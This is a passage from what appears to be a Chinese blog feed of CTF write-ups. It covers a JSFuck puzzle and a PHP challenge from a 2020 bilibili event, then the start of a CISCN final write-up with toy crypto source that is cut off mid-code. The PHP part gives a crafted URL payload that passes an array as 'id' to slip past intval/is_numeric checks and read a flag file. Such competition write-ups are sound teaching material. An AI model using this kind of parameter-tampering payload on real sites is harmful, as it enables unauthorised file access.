[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))</code></pre><p>一看就是 JSFuck，直接浏览器里执行得到</p><pre><code>"var str1 = \"\\u7a0b\\u5e8f\\u5458\\u6700\\u591a\\u7684\\u5730\\u65b9\";var str2 = \"bilibili1024havefun\";console.log()"</code></pre><p>str1 为 <code>程序员最多的地方</code> ==&gt; GitHub</p><p>GitHub 上 找到了这里（</p><p><a href="https://github.com/interesting-1024/end/blob/main/end.php" target="_blank" rel="noopener">https://github.com/interesting-1024/end/blob/main/end.php</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//filename end.php</span><span class="token variable">$bilibili</span> <span class="token operator">=</span> <span class="token string">"bilibili1024havefun"</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\d/is'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$reg</span> <span class="token operator">!==</span> <span class="token number">1</span> <span class="token keyword">and</span> <span class="token variable">$str</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//文件路径猜解</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"还差一点点啦～"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"你想要的不在这儿～"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><a href="http://120.92.151.189/blog/end.php" target="_blank" rel="noopener">http://120.92.151.189/blog/end.php</a></p><blockquote><p>你想要的不在这儿～</p></blockquote><p>构造payload：</p><pre><code>http://120.92.151.189/blog/end.php?id[]=1&amp;url=./flag.txt</code></pre><p>得到下图，文件名称为 </p><p><code>bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg</code></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg" alt="img"></p><p>在文件最后藏了 flag10。</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025235356626.png" alt="flag10"></p><p><code>2ebd3b08-47ffc478-b49a5f9d-f6099d65</code></p><blockquote><p>另外发现这个url只要包含 <code>flag.txt</code> 就返回这个。。</p><p>盲猜 <code>/.+flag\.txt.*/</code></p></blockquote><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://github.com/interesting-1024" target="_blank" rel="noopener">interesting-1024</a>/<strong><a href="https://github.com/interesting-1024/end" target="_blank" rel="noopener">end</a></strong> 这个仓库的 issue 简直成了聊天室……</p><p>另外，有师傅在 <a href="https://www.bilibili.com/blackboard/activity-20201024.html" target="_blank" rel="noopener">https://www.bilibili.com/blackboard/activity-20201024.html</a> 页面上发现了隐藏的彩蛋。</p><p>据说多次刷新重启可触发。</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/97101831-7fa37600-16db-11eb-886f-c3b8c8e6c9b8.png" alt="彩蛋"></p><p>怎么说呢，总的感觉，这些题目更像是<strong>脑筋急转弯</strong>，略偏娱乐化这样吧。</p><p>就不像正经的 CTF 题的意思。</p><p>至于第6、7、9题，也没做下去的兴趣了。</p><p>就这样吧，不玩了，吃瓜吃瓜。</p><p><em>更新于 20201026 凌晨</em></p><p>（溜了喵</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 CISCN 国赛总决赛 部分解题复现</title>
      <link href="/2020/10/06/CTF_2020CISCN_final/"/>
      <url>/2020/10/06/CTF_2020CISCN_final/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好不容易经过线上初赛、分区选拔赛，终于有机会去线下打了场 CTF 国赛，感谢大师傅们带我玩~</p><p>辣鸡平台（ylbnb）什么的就不吐槽了，总的来说国赛其实还挺爽的 2333，混吃混喝划水的是我了。</p><p>第一天 AWD 一开始被打得贼惨了，中间修平台过了一个小时，本来都想好接下来要怎么打了，接着平台又崩了过了几个小时吃了个晚饭最后说不打了。。<em>（第一次正式打 AWD 就是国赛了也太惨了</em></p><p>第二天改成了三小时 Break 解题赛 + 两小时 Fix，解题只会签到嘤嘤嘤（（（</p><p>趁着还有点印象就来复现几个题吧。</p><p><em>（知道了我自己爪巴</em></p><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lockrise"><a href="#lockrise" class="headerlink" title="lockrise"></a>lockrise</h3><p><strong>Source:</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> DES<span class="token triple-quoted-string string">'''sbox=list(range(256))random.shuffle(sbox)print(sbox)'''</span>sbox<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">228</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">205</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">181</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">197</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">219</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">191</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">226</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">212</span><span class="token punctuation">,</span> <span class="token number">206</span><span class="token punctuation">,</span> <span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">223</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">235</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">184</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">213</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">192</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">246</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">216</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">143</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">202</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">211</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">247</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">176</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">lock</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> m<span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sbox<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">peak</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span>m<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">rise</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> len<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">==</span>len<span class="token punctuation">(</span>k<span class="token punctuation">)</span>    r<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>append<span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> rkey<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>secret<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token punctuation">(</span>r<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lockrise:"</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"k0 ^ k7:"</span><span class="token punctuation">,</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>secret<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>r<span class="token operator">=</span>lock<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>r<span class="token operator">=</span>peak<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token operator">=</span>rise<span class="token 